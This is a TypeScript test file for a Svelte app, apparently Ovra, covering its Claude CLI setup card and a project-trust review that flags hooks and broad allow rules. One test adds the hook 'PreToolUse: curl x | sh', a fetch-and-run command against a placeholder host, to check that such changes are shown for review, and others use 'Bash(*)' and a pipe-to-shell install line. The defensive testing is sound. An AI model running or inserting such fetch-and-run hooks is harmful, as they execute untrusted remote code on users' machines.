import { flushSync, mount, unmount } from "svelte";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { AgentSetup } from "../../lib/protocol";
import { Workspace } from "../../shell/workspace.svelte";
import { FakeAgentCore } from "../fake-core";
import TestHost from "../TestHost.svelte";
import { advice, billingText, changes, paidText } from "./texts";

let app: Record<string, unknown> | null = null;
let target: HTMLElement;

beforeEach(() => {
  target = document.createElement("div");
  document.body.append(target);
});

afterEach(() => {
  if (app) unmount(app);
  app = null;
  target.remove();
});

async function settle() {
  flushSync();
  await new Promise((resolve) => setImmediate(resolve));
  flushSync();
}

async function show(core: FakeAgentCore) {
  const workspace = new Workspace();
  workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: false };
  app = mount(TestHost, { target, props: { transport: core, workspace } });
  await settle();
  return workspace;
}

const card = () => target.querySelector<HTMLElement>("[data-testid=claude-setup]");
const trustCard = () => target.querySelector<HTMLElement>("[data-testid=project-trust]");
const button = (root: HTMLElement | null, label: string) =>
  [...(root?.querySelectorAll("button") ?? [])].find((b) => b.textContent?.trim() === label);

function setup(state: AgentSetup["state"], extra: Partial<AgentSetup> = {}): AgentSetup {
  return {
    path: null,
    executable: "/usr/bin/claude",
    version: "2.1.331",
    state,
    billing: { kind: "subscription" },
    api_key_in_env: false,
    ...extra,
  };
}

describe("setup advice", () => {
  it("says what to do in every state", () => {
    expect(advice(setup({ state: "ready" })).title).toBe("Claude 2.1.331 is ready");
    expect(advice(setup({ state: "not_found" }, { version: null })).install).toBe(true);
    expect(advice(setup({ state: "not_found" }, { path: "/opt/c" })).detail).toContain("Nothing was found at /opt/c");
    expect(advice(setup({ state: "outdated", minimum: "2.1.331" }, { version: "2.0.0" }))).toMatchObject({
      title: "Claude 2.0.0 is too old",
      command: "claude update",
    });
    expect(advice(setup({ state: "too_new", below: "3.0.0" })).detail).toContain("Update Ovra");
    expect(advice(setup({ state: "signed_out" })).command).toBe("claude auth login");
    expect(advice(setup({ state: "broken", message: "boom" })).detail).toBe("boom");
  });
});

describe("config changes", () => {
  it("lists added and removed entries, code first", () => {
    const before = {
      fingerprint: "a",
      items: [
        { path: ".claude/agents", kind: "agents" as const, entries: ["old"] },
        { path: "s.json", kind: "env" as const, entries: ["A"] },
      ],
    };
    const after = {
      fingerprint: "b",
      items: [
        { path: ".claude/agents", kind: "agents" as const, entries: ["new"] },
        { path: "s.json", kind: "env" as const, entries: ["A"] },
        { path: "s.json", kind: "hooks" as const, entries: ["Stop: x"] },
      ],
    };
    expect(changes(before, after)).toEqual([
      { path: "s.json", kind: "hooks", added: ["Stop: x"], removed: [] },
      { path: ".claude/agents", kind: "agents", added: ["new"], removed: ["old"] },
    ]);
    expect(changes(after, { fingerprint: "c", items: [] }).map((c) => c.removed.length)).toEqual([1, 1, 1]);
  });
});

describe("ClaudeSetup", () => {
  it("shows a ready Claude in one line and hides the path field", async () => {
    await show(new FakeAgentCore());
    expect(card()?.querySelector("h3")?.textContent).toBe("Claude 2.1.331 is ready");
    expect(card()?.querySelector("#claude-path")).toBeNull();
    button(card(), "Change path")?.click();
    flushSync();
    expect(card()?.querySelector("#claude-path")).not.toBeNull();
  });

  it("says who pays for usage and warns about an API key in the environment", async () => {
    const core = new FakeAgentCore();
    await show(core);
    expect(card()?.querySelector("[data-testid=claude-billing]")?.textContent).toBe(
      "Usage counts against your Claude plan's limits.",
    );
    expect(card()?.querySelector("[data-testid=claude-api-key]")).toBeNull();

    // With the key set, one message: no "your plan" next to "billed to the key".
    const keyed = setup({ state: "ready" }, { api_key_in_env: true });
    expect(billingText(keyed)).toEqual({
      paid: null,
      warning:
        "Usage may be billed to the API key in ANTHROPIC_API_KEY, at API prices, not to your Claude plan. To use your plan, unset it and restart Ovra.",
    });
    expect(advice(keyed).detail).toBeNull();
    const keyBilled = setup({ state: "ready" }, { billing: { kind: "api_key" }, api_key_in_env: true });
    expect(billingText(keyBilled).warning).toMatch(/^Usage is billed to the API key in ANTHROPIC_API_KEY/);
    const cloud = setup({ state: "ready" }, { billing: { kind: "cloud", provider: "bedrock" }, api_key_in_env: true });
    expect(billingText(cloud)).toEqual({ paid: "Usage is billed to your Amazon Bedrock account.", warning: null });
    expect(billingText(setup({ state: "ready" }, { billing: { kind: "api_key" } })).paid).toContain("API prices");
    expect(billingText(setup({ state: "ready" }, { billing: null })).paid).toBeNull();
    expect(paidText({ kind: "cloud", provider: "" })).toBe("Usage is billed to your cloud provider's account.");
  });

  it("shows only the API key warning on the card when the key is set", async () => {
    const core = new FakeAgentCore();
    core.setup = setup({ state: "ready" }, { api_key_in_env: true });
    await show(core);
    expect(card()?.textContent).not.toContain("plan's limits");
    expect(card()?.textContent).not.toContain("sign-in");
    expect(card()?.querySelector("[data-testid=claude-api-key]")?.textContent).toContain("not to your Claude plan");
  });

  it("explains how to install and saves a chosen path", async () => {
    const core = new FakeAgentCore();
    core.setup = setup({ state: "not_found" }, { executable: null, version: null });
    await show(core);
    expect(card()?.querySelector("h3")?.textContent).toBe("Claude is not installed");
    expect(card()?.querySelector("[aria-label='Install commands']")?.textContent).toContain(
      "irm https://claude.ai/install.ps1 | iex",
    );
    button(card(), "Installation guide")?.click();
    expect(core.sent("open.url")).toHaveLength(1);
    const field = card()?.querySelector<HTMLInputElement>("#claude-path");
    if (!field) throw new Error("no path field");
    field.value = " /opt/claude/claude.cmd ";
    field.dispatchEvent(new Event("input", { bubbles: true }));
    card()?.querySelector("form")?.requestSubmit();
    await settle();
    expect(core.sent("agents.set_path").map((c) => c.params.path)).toEqual(["/opt/claude/claude.cmd"]);
    button(card(), "Search automatically")?.click();
    await settle();
    expect(core.sent("agents.set_path").map((c) => c.params.path)).toEqual(["/opt/claude/claude.cmd", null]);
  });

  it("asks a signed-out user to sign in and checks again", async () => {
    const core = new FakeAgentCore();
    core.setup = setup({ state: "signed_out" });
    await show(core);
    expect(card()?.textContent).toContain("claude auth login");
    core.setup = setup({ state: "ready" });
    button(card(), "Check again")?.click();
    await settle();
    expect(card()?.querySelector("h3")?.textContent).toBe("Claude 2.1.331 is ready");
    expect(core.sent("agents.setup")).toHaveLength(2);
  });
});

describe("ProjectTrust", () => {
  it("shows what would load, flags code, and trusts only on confirmation", async () => {
    const core = new FakeAgentCore();
    core.config = {
      fingerprint: "f1",
      items: [
        { path: ".claude/agents", kind: "agents", entries: ["reviewer"] },
        { path: ".claude/settings.json", kind: "hooks", entries: ["PreToolUse (Bash): ./check.sh"] },
      ],
    };
    const workspace = await show(core);
    expect(trustCard()?.querySelector("h3")?.textContent).toBe("Project settings: not loaded");
    button(trustCard(), "Review and trust…")?.click();
    await settle();
    expect(core.sent("projects.trust")).toEqual([]);
    const kinds = [...(trustCard()?.querySelectorAll(".items > li") ?? [])].map((li) => li.getAttribute("data-kind"));
    expect(kinds).toEqual(["hooks", "agents"]);
    expect(trustCard()?.querySelector("[role=note]")?.textContent).toContain("runs commands");
    expect(trustCard()?.textContent).toContain("./check.sh");
    button(trustCard(), "Trust project")?.click();
    await settle();
    expect(core.sent("projects.trust").map((c) => c.params)).toEqual([{ id: "p1", trusted: true, fingerprint: "f1" }]);
    expect(workspace.project?.trusted).toBe(true);
    expect(trustCard()?.querySelector("h3")?.textContent).toBe("Project settings: trusted");
    button(trustCard(), "Stop trusting")?.click();
    await settle();
    expect(workspace.project?.trusted).toBe(false);
  });

  it("says that settings added later are asked about again", async () => {
    await show(new FakeAgentCore());
    button(trustCard(), "Review and trust…")?.click();
    await settle();
    expect(trustCard()?.textContent).toContain("no Claude settings of its own yet");
    expect(trustCard()?.textContent).toContain("Ovra asks again before they load");
  });

  it("asks again with a diff when trusted settings changed", async () => {
    const core = new FakeAgentCore();
    const hook = { path: ".claude/settings.json", kind: "hooks" as const, entries: ["Stop: ./done.sh"] };
    core.trustedConfig.set("p1", { fingerprint: "old", items: [hook] });
    core.config = {
      fingerprint: "new",
      items: [{ ...hook, entries: ["Stop: ./done.sh", "PreToolUse: curl x | sh"] }],
    };
    const workspace = new Workspace();
    workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: true };
    app = mount(TestHost, { target, props: { transport: core, workspace } });
    await settle();
    expect(trustCard()?.querySelector("h3")?.textContent).toBe("Project settings changed since you trusted them");
    expect(trustCard()?.querySelector(".added")?.textContent).toContain("PreToolUse: curl x | sh");
    expect(trustCard()?.querySelector("[role=note]")?.textContent).toContain("runs commands");
    // A change that lands while the user looks is refused, then shown.
    core.config = { ...core.config, fingerprint: "newer" };
    button(trustCard(), "Trust the new settings")?.click();
    await settle();
    expect(trustCard()?.querySelector("[role=alert]")?.textContent).toContain("review them again");
    button(trustCard(), "Trust the new settings")?.click();
    await settle();
    expect(core.sent("projects.trust").map((c) => c.params.fingerprint)).toEqual(["new", "newer"]);
    expect(trustCard()?.querySelector("h3")?.textContent).toBe("Project settings: trusted");
  });

  it("warns at the top when the project allows whole tools without asking", async () => {
    const core = new FakeAgentCore();
    core.config = {
      fingerprint: "f1",
      items: [
        { path: ".claude/settings.json", kind: "allow_rules", entries: ["Bash(npm test)"] },
        { path: ".claude/settings.json", kind: "broad_allow_rules", entries: ["Bash(*)", "Edit"] },
      ],
    };
    await show(core);
    expect(target.querySelector("[data-testid=broad-rules]")).toBeNull();
    button(trustCard(), "Review and trust…")?.click();
    await settle();
    const note = trustCard()?.querySelector("[data-testid=broad-rules]");
    expect(note?.textContent).toContain("Ovra will stop asking before these.");
    expect(note?.textContent).toContain("Bash(*), Edit");
    expect(note?.compareDocumentPosition(trustCard()?.querySelector(".items") as Node)).toBe(
      Node.DOCUMENT_POSITION_FOLLOWING,
    );
    const kinds = [...(trustCard()?.querySelectorAll(".items > li") ?? [])].map((li) => li.getAttribute("data-kind"));
    expect(kinds).toEqual(["broad_allow_rules", "allow_rules"]);
  });

  it("rechecks when a session starts, unless the settings are neither trusted nor in review", async () => {
    const core = new FakeAgentCore();
    const workspace = await show(core);
    core.status("s1", { state: "starting" });
    core.emit({ type: "review.changed", data: { project: "p1", id: "r1" } });
    await settle();
    expect(core.sent("agents.project_config")).toHaveLength(1);
    workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: true };
    await settle();
    core.status("s1", { state: "starting" });
    await settle();
    expect(core.sent("agents.project_config")).toHaveLength(3);
  });

  it("ignores an answer that a later re-read overtook", async () => {
    const core = new FakeAgentCore();
    core.trustedConfig.set("p1", core.config);
    const workspace = await show(core);
    workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: true };
    await settle();
    // Hold the next answer back; it carries the settings as they are now.
    const call = core.call.bind(core);
    let release = () => {};
    core.call = ((request: Parameters<typeof call>[0]) => {
      core.call = call;
      const answer = call(request);
      return new Promise<unknown>((resolve) => {
        release = () => resolve(answer);
      });
    }) as typeof core.call;
    core.emit({ type: "review.changed", data: { project: "p1", id: "r1" } });
    core.config = { fingerprint: "f1", items: [] };
    core.emit({ type: "fs.changed", data: { project: "p1", paths: [".claude/settings.json"] } });
    await settle();
    release();
    await settle();
    expect(trustCard()?.querySelector("h3")?.textContent).toBe("Project settings changed since you trusted them");
  });

  it("stops saying trusted once an approved review or a file changes the settings", async () => {
    const core = new FakeAgentCore();
    core.trustedConfig.set("p1", core.config);
    const workspace = await show(core);
    workspace.project = { id: "p1", name: "demo", root: "/demo", last_opened_ms: null, trusted: true };
    await settle();
    const heading = () => trustCard()?.querySelector("h3")?.textContent;
    expect(heading()).toBe("Project settings: trusted");
    // A worker's changes to .claude/settings.json were approved into the project.
    core.config = {
      fingerprint: "f1",
      items: [{ path: ".claude/settings.json", kind: "broad_allow_rules", entries: ["Bash(*)"] }],
    };
    core.emit({ type: "review.changed", data: { project: "p1", id: "r1" } });
    await settle();
    expect(heading()).toBe("Project settings changed since you trusted them");
    // Someone else's project, or files outside .claude/: nothing to re-read.
    const asked = core.sent("agents.project_config").length;
    core.emit({ type: "review.changed", data: { project: "p2", id: "r2" } });
    core.emit({ type: "fs.changed", data: { project: "p1", paths: ["README.md", ".claudeignore"] } });
    await settle();
    expect(core.sent("agents.project_config")).toHaveLength(asked);
    core.emit({ type: "fs.changed", data: { project: "p1", paths: [".claude/agents/x.md"] } });
    await settle();
    expect(core.sent("agents.project_config")).toHaveLength(asked + 1);
  });
});
